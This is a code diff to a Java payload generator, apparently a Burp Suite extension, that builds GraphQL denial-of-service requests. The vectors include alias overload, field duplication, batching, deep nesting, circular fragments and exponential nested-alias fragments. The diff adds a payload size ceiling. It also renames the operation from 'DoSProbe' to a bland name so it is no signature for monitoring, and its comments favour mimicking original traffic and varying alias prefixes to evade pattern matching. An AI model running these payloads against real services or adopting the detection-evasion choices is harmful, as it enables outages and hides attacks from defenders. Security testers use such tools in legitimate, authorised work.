@@ -13,6 +13,16 @@ import java.util.List;
  */
 public final class PayloadFactory {
 
+    /**
+     * Refuse to allocate beyond this. A String this long already costs twice
+     * its length in heap, and the StringBuilder that produces it peaks higher
+     * again during its final copy; past this point the extension is a far
+     * bigger risk to Burp than the payload is to the target. Well above any
+     * useful test -- a proxy or body-size limit rejects requests two orders of
+     * magnitude smaller than this.
+     */
+    public static final long MAX_PAYLOAD_BYTES = 32L * 1024 * 1024;
+
     public enum Vector {
         ALIAS_OVERLOAD("Alias overload", "N aliased copies of the operation's top-level fields."),
         FIELD_DUPLICATION("Field duplication", "Same field repeated N times without aliases (tests dedupe)."),
@@ -49,8 +59,12 @@ public final class PayloadFactory {
         public String typeName = "User";
         /** Fan-out per level for the nested-alias vector. 2-3 is plenty. */
         public int breadth = 2;
-        /** Operation name used when building an envelope from scratch. */
-        public String opName = "DoSProbe";
+        /**
+         * Operation name used when building an envelope from scratch. Kept
+         * bland on purpose: it goes on the wire, and a name that announces the
+         * test is a free signature for anything watching.
+         */
+        public String opName = "Probe";
         /**
          * Prefix for generated aliases. Aliases are prefix + index, so "a"
          * gives a0, a1... Change it when the default pattern is being matched
@@ -75,6 +89,14 @@ public final class PayloadFactory {
 
     /** Builds the HTTP request body for the given vector at size N. */
     public static String body(Vector v, Config c, int n) {
+        long projected = estimatedBytes(v, c, n);
+        if (projected > MAX_PAYLOAD_BYTES) {
+            throw new IllegalStateException(String.format(
+                    "%s at N=%,d would build about %,d bytes, over the %,d byte ceiling. "
+                            + "Lower N. Anything near this size is rejected on body size long "
+                            + "before the server costs it, which reads as 'protected' and is not.",
+                    v.label, n, projected, MAX_PAYLOAD_BYTES));
+        }
         return c.rawMode() ? rawBody(v, c, n) : schemaBody(v, c, n);
     }
 
@@ -85,36 +107,51 @@ public final class PayloadFactory {
 
     // ------------------------------------------------------------- raw mode
 
-    private static String rawBody(Vector v, Config c, int n) {
-        String src = c.requestBody.trim();
+    /** The captured request, parsed once and shared by the builder and the estimator. */
+    private static final class Raw {
+        final String template;
+        final int[] span;
+        final String doc;
+        final RawQuery query;
+        final List<String> fields;
 
+        Raw(String template, int[] span, String doc, RawQuery query, List<String> fields) {
+            this.template = template;
+            this.span = span;
+            this.doc = doc;
+            this.query = query;
+            this.fields = fields;
+        }
+    }
+
+    private static Raw raw(Config c) {
+        String src = c.requestBody.trim();
         // An array body is a batch already: use its first element as template.
         String template = src.startsWith("[") ? firstArrayElement(src) : src;
         int[] span = template.startsWith("{") ? topLevelStringSpan(template, "query") : null;
-        boolean hasEnvelope = span != null;
+        String doc = span != null ? unescape(template.substring(span[0], span[1])) : template;
+        RawQuery q = RawQuery.parse(doc);
+        return new Raw(template, span, doc, q, q.topLevelFields());
+    }
 
-        String doc = hasEnvelope
-                ? unescape(template.substring(span[0], span[1]))
-                : template;
+    private static String rawBody(Vector v, Config c, int n) {
+        Raw r = raw(c);
 
         if (v == Vector.INTROSPECTION_DEPTH) {
-            return wrap(template, span, introspectionDepth(c, n), c);
-        }
-        if (needsCycle(v)) {
-            throw new IllegalStateException(v.label
-                    + " needs a self-referencing field. This operation has no recursive edge, "
-                    + "so the vector does not apply to this schema.");
+            return wrap(r.template, r.span, introspectionDepth(c, n), c);
         }
 
-        RawQuery q = RawQuery.parse(doc);
-        List<String> fields = q.topLevelFields();
-        if (fields.isEmpty()) {
+        if (needsCycle(v)) {
+            return wrap(r.template, r.span, cycleDocFromCapture(v, c, n, r), c);
+        }
+
+        if (r.fields.isEmpty()) {
             throw new IllegalStateException("no top-level fields found in the operation");
         }
 
         if (v == Vector.ARRAY_BATCH) {
             // N copies of the untouched original request, as a JSON array.
-            String one = hasEnvelope ? template : jsonEnvelope(doc, null, q.name);
+            String one = r.span != null ? r.template : jsonEnvelope(r.doc, null, r.query.name);
             StringBuilder sb = new StringBuilder("[");
             for (int i = 0; i < n; i++) {
                 if (i > 0) {
@@ -131,18 +168,18 @@ public final class PayloadFactory {
             for (int x = 0; x < n; x++) {
                 d.append(" @d").append(x % 32);
             }
-            for (int k = 0; k < fields.size(); k++) {
+            for (int k = 0; k < r.fields.size(); k++) {
                 sel.append("  ").append(alias(c, k, -1)).append(": ")
-                   .append(RawQuery.withDirectives(fields.get(k), d.toString())).append('\n');
+                   .append(RawQuery.withDirectives(r.fields.get(k), d.toString())).append('\n');
             }
         } else {
             for (int i = 0; i < n; i++) {
-                for (int k = 0; k < fields.size(); k++) {
+                for (int k = 0; k < r.fields.size(); k++) {
                     if (v == Vector.FIELD_DUPLICATION) {
-                        sel.append("  ").append(fields.get(k)).append('\n');
+                        sel.append("  ").append(r.fields.get(k)).append('\n');
                     } else {
-                        sel.append("  ").append(alias(c, i, fields.size() > 1 ? k : -1))
-                           .append(": ").append(fields.get(k)).append('\n');
+                        sel.append("  ").append(alias(c, i, r.fields.size() > 1 ? k : -1))
+                           .append(": ").append(r.fields.get(k)).append('\n');
                     }
                 }
             }
@@ -150,9 +187,92 @@ public final class PayloadFactory {
 
         // Keep the original operation name: the envelope's operationName must
         // still resolve, and matching traffic is less conspicuous.
-        String newDoc = q.header() + " {\n" + sel + "}"
-                + (q.trailing.isEmpty() ? "" : "\n" + q.trailing);
-        return wrap(template, span, newDoc, c);
+        String newDoc = r.query.header() + " {\n" + sel + "}"
+                + (r.query.trailing.isEmpty() ? "" : "\n" + r.query.trailing);
+        return wrap(r.template, r.span, newDoc, c);
+    }
+
+    /**
+     * Builds a recursion-based document around a captured operation.
+     *
+     * The captured request supplies the operation header -- keyword, name and
+     * variable definitions -- and its first top-level field, arguments and all,
+     * as the entry point. The recursive edge itself cannot come from the
+     * capture: a client query that already contained one would not be
+     * interesting to multiply. It comes from the Schema fields tab.
+     *
+     * The original selection set is replaced, so the captured document's own
+     * fragment definitions are dropped: an unused fragment is a validation
+     * error, and keeping them would get the payload rejected for a reason that
+     * has nothing to do with the control being tested.
+     */
+    private static String cycleDocFromCapture(Vector v, Config c, int n, Raw r) {
+        if (blank(c.cycleField)) {
+            throw new IllegalStateException(v.label + " needs a self-referencing field, and a "
+                    + "captured query does not contain one. Set 'Cycle field' on the Schema "
+                    + "fields tab to the recursive edge (for example 'friends'); it is combined "
+                    + "with this request's own root field and variables.");
+        }
+        if (v != Vector.DEEP_NESTING && blank(c.typeName)) {
+            throw new IllegalStateException(v.label + " builds fragments, so it also needs "
+                    + "'Type name' on the Schema fields tab: the type that '" + c.cycleField
+                    + "' returns.");
+        }
+        if (r.fields.isEmpty()) {
+            throw new IllegalStateException("no top-level fields found in the operation");
+        }
+
+        // Entry point: the captured field's name, arguments and directives,
+        // with its own selection set discarded -- we supply a new one.
+        String head = RawQuery.fieldHead(r.fields.get(0));
+        String leaf = blank(c.leafField) ? "__typename" : c.leafField;
+
+        StringBuilder sb = new StringBuilder();
+        String inner;
+        switch (v) {
+            case DEEP_NESTING: {
+                StringBuilder nest = new StringBuilder();
+                for (int i = 0; i < n; i++) {
+                    nest.append(c.cycleField).append(" { ");
+                }
+                nest.append(leaf).append(' ');
+                for (int i = 0; i < n; i++) {
+                    nest.append("} ");
+                }
+                inner = nest.toString();
+                break;
+            }
+            case CIRCULAR_FRAGMENT: {
+                int count = Math.max(2, n);
+                for (int i = 0; i < count; i++) {
+                    sb.append("fragment f").append(i).append(" on ").append(c.typeName)
+                      .append(" { ").append(c.cycleField).append(" { ...f")
+                      .append((i + 1) % count).append(" } }\n");
+                }
+                inner = "...f0";
+                break;
+            }
+            case NESTED_ALIAS: {
+                int depth = Math.max(1, n);
+                int breadth = Math.max(2, c.breadth);
+                sb.append("fragment L0 on ").append(c.typeName).append(" { ").append(leaf).append(" }\n");
+                for (int d = 1; d <= depth; d++) {
+                    sb.append("fragment L").append(d).append(" on ").append(c.typeName).append(" { ");
+                    for (int b = 0; b < breadth; b++) {
+                        sb.append("b").append(b).append(": ").append(c.cycleField)
+                          .append(" { ...L").append(d - 1).append(" } ");
+                    }
+                    sb.append("}\n");
+                }
+                inner = "...L" + depth;
+                break;
+            }
+            default:
+                throw new IllegalArgumentException("not a cycle vector: " + v);
+        }
+
+        sb.append(r.query.header()).append(" { ").append(head).append(" { ").append(inner).append(" } }");
+        return sb.toString();
     }
 
     /** Splices a document into the captured envelope, or synthesises one. */
@@ -219,6 +339,7 @@ public final class PayloadFactory {
     }
 
     private static String deepNesting(Config c, int n) {
+        requireCycleField(Vector.DEEP_NESTING, c);
         StringBuilder sb = new StringBuilder("query ").append(c.opName).append(" { ")
                 .append(c.rootField).append(" { ");
         for (int i = 0; i < n; i++) {
@@ -232,6 +353,8 @@ public final class PayloadFactory {
     }
 
     private static String circularFragment(Config c, int n) {
+        requireCycleField(Vector.CIRCULAR_FRAGMENT, c);
+        requireTypeName(Vector.CIRCULAR_FRAGMENT, c);
         int count = Math.max(2, n);
         StringBuilder sb = new StringBuilder();
         for (int i = 0; i < count; i++) {
@@ -270,6 +393,8 @@ public final class PayloadFactory {
      * N is the depth here, not a node count.
      */
     private static String nestedAlias(Config c, int n) {
+        requireCycleField(Vector.NESTED_ALIAS, c);
+        requireTypeName(Vector.NESTED_ALIAS, c);
         int depth = Math.max(1, n);
         int breadth = Math.max(2, c.breadth);
         String leaf = blank(c.leafField) ? "__typename" : c.leafField;
@@ -287,6 +412,21 @@ public final class PayloadFactory {
         sb.append("query ").append(c.opName).append(" { ")
           .append(c.rootField).append(" { ...L").append(depth).append(" } }");
         return sb.toString();
+    }
+
+    private static void requireCycleField(Vector v, Config c) {
+        if (blank(c.cycleField)) {
+            throw new IllegalStateException(v.label + " needs a self-referencing field. Set "
+                    + "'Cycle field' to the recursive edge, for example 'friends'. A schema "
+                    + "with no such edge cannot be tested for amplification this way.");
+        }
+    }
+
+    private static void requireTypeName(Vector v, Config c) {
+        if (blank(c.typeName)) {
+            throw new IllegalStateException(v.label + " builds fragments, so it needs 'Type name': "
+                    + "the type that '" + c.cycleField + "' returns.");
+        }
     }
 
     // ---------------------------------------------------------------- helpers
@@ -478,5 +618,67 @@ public final class PayloadFactory {
             return (nodes >= Long.MAX_VALUE || Double.isInfinite(nodes)) ? Long.MAX_VALUE : (long) nodes;
         }
         return n;
+    }
+
+    /**
+     * Projects the payload size before anything is allocated, so an N that
+     * would exhaust the heap is refused rather than attempted.
+     *
+     * Deliberately approximate and deliberately never an under-estimate by
+     * much: it exists to catch the order-of-magnitude mistake (N=1,000,000 on a
+     * 1.3 KB field), not to predict the exact byte count, which the caller gets
+     * from the built payload anyway.
+     */
+    public static long estimatedBytes(Vector v, Config c, int n) {
+        long count = Math.max(0L, (long) n);
+        if (!c.rawMode()) {
+            long field = len(c.rootField) + len(c.leafField) + 8;
+            long prefix = len(c.aliasPrefix) + 12;
+            switch (v) {
+                case ALIAS_OVERLOAD:      return 64 + count * (field + prefix);
+                case FIELD_DUPLICATION:   return 64 + count * (field + 4);
+                case ARRAY_BATCH:         return 64 + count * (field + prefix + 48);
+                case DIRECTIVE_OVERLOAD:  return 64 + field + count * 5;
+                case DEEP_NESTING:        return 64 + field + count * (len(c.cycleField) + 6);
+                case CIRCULAR_FRAGMENT:   return 64 + field
+                        + count * (len(c.typeName) + len(c.cycleField) + 40);
+                case INTROSPECTION_DEPTH: return 64 + count * 11;
+                case NESTED_ALIAS:        return 64 + field + count
+                        * (len(c.typeName) + (long) Math.max(2, c.breadth) * (len(c.cycleField) + 20));
+                default:                  return 64 + count * (field + prefix);
+            }
+        }
+
+        Raw r;
+        try {
+            r = raw(c);
+        } catch (RuntimeException e) {
+            // Unparseable input: let the real build report the parse error.
+            return 0;
+        }
+        long template = r.template.length();
+        long fields = 0;
+        for (String f : r.fields) {
+            fields += f.length();
+        }
+        long perCopy = fields + (long) r.fields.size() * (len(c.aliasPrefix) + 14);
+
+        switch (v) {
+            case ARRAY_BATCH:         return count * (template + 1);
+            case FIELD_DUPLICATION:   return template + count * (fields + (long) r.fields.size() * 4);
+            case ALIAS_OVERLOAD:      return template + count * perCopy;
+            case DIRECTIVE_OVERLOAD:  return template + fields + count * (long) Math.max(1, r.fields.size()) * 5;
+            case DEEP_NESTING:        return template + count * (len(c.cycleField) + 6);
+            case CIRCULAR_FRAGMENT:   return template
+                    + count * (len(c.typeName) + len(c.cycleField) + 40);
+            case INTROSPECTION_DEPTH: return template + count * 11;
+            case NESTED_ALIAS:        return template + count
+                    * (len(c.typeName) + (long) Math.max(2, c.breadth) * (len(c.cycleField) + 20));
+            default:                  return template + count * perCopy;
+        }
+    }
+
+    private static long len(String s) {
+        return s == null ? 0 : s.length();
     }
 }
